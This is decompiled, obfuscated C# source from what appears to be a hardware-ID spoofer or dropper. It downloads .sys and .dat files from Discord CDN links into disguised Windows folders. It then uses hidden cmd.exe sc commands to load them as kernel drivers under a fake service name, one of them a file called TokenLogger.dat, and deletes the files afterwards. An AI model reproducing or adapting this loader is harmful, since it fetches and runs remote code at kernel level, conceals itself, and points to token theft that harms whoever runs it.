using System.Diagnostics;
using System.IO;
using System.Net;

internal class Class15
{
	public static void smethod_0()
	{
		_003CModule_003E.Class0.smethod_0();
		WebClient webClient = new WebClient();
		webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/661208670897438731/718630769991614474/prespoof.dat", "C:\\Windows\\Speech\\prespoof.dat");
		webClient.Proxy = null;
	}

	public static void smethod_1()
	{
		_003CModule_003E.Class0.smethod_0();
		WebClient webClient = new WebClient();
		webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/704851400882126929/704852784985669662/spoof.sys", "C:\\Windows\\Cursors\\spoof.sys");
		webClient.Proxy = null;
	}

	public static void smethod_2()
	{
		_003CModule_003E.Class0.smethod_0();
		smethod_6("sc create WINSYS32x64 binPath= C:\\Windows\\Speech\\spoof.sys type= kernel");
		smethod_6("sc start WINSYS32x64");
		smethod_6("sc stop WINSYS32x64");
		smethod_6("sc delete WINSYS32x64");
	}

	public static void smethod_3()
	{
		_003CModule_003E.Class0.smethod_0();
		WebClient webClient = new WebClient();
		webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/704851400882126929/704852870457196615/cpuspoofer.sys", "C:\\Windows\\Cursors\\cpuspoofer.sys");
		webClient.Proxy = null;
	}

	public static void smethod_4()
	{
		_003CModule_003E.Class0.smethod_0();
		smethod_6("sc create WINSYS32x64 binPath= C:\\Windows\\Speech\\cpuspoofer.sys type= kernel");
		smethod_6("sc start WINSYS32x64");
		smethod_6("sc stop WINSYS32x64");
		smethod_6("sc delete WINSYS32x64");
	}

	public static void smethod_5()
	{
		_003CModule_003E.Class0.smethod_0();
		smethod_6("sc create WINSYS32x64 binPath= C:\\Windows\\Speech\\TokenLogger.dat type= kernel");
		smethod_6("sc start WINSYS32x64");
		smethod_6("sc stop WINSYS32x64");
		smethod_6("sc delete WINSYS32x64");
		File.Delete("C:\\Windows\\Speech\\TokenLogger.dat");
		File.Delete("C:\\Windows\\Speech\\net.exe");
		File.Delete("C:\\Windows\\Speech\\5kIRRg37FJ.dat");
		File.Delete("C:\\Windows\\Speech\\cpuspoofer.sys");
		File.Delete("C:\\Windows\\Speech\\HDD.dat");
	}

	private static void smethod_6(string string_0)
	{
		_003CModule_003E.Class0.smethod_0();
		Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + string_0)
		{
			CreateNoWindow = true,
			UseShellExecute = false,
			RedirectStandardError = true,
			RedirectStandardOutput = true
		});
		process.WaitForExit();
		process.StandardOutput.ReadToEnd();
		process.StandardError.ReadToEnd();
		_ = process.ExitCode;
		process.Close();
	}

	public Class15()
	{
		_003CModule_003E.Class0.smethod_0();
		base._002Ector();
	}

	static void smethod_16(object object_0, bool bool_0)
	{
		((ProcessStartInfo)object_0).CreateNoWindow = bool_0;
	}

	static void smethod_17(object object_0, bool bool_0)
	{
		((ProcessStartInfo)object_0).UseShellExecute = bool_0;
	}

	static void smethod_18(object object_0, bool bool_0)
	{
		((ProcessStartInfo)object_0).RedirectStandardError = bool_0;
	}

	static void smethod_19(object object_0, bool bool_0)
	{
		((ProcessStartInfo)object_0).RedirectStandardOutput = bool_0;
	}

	static object smethod_20(ProcessStartInfo processStartInfo_0)
	{
		return Process.Start(processStartInfo_0);
	}
}
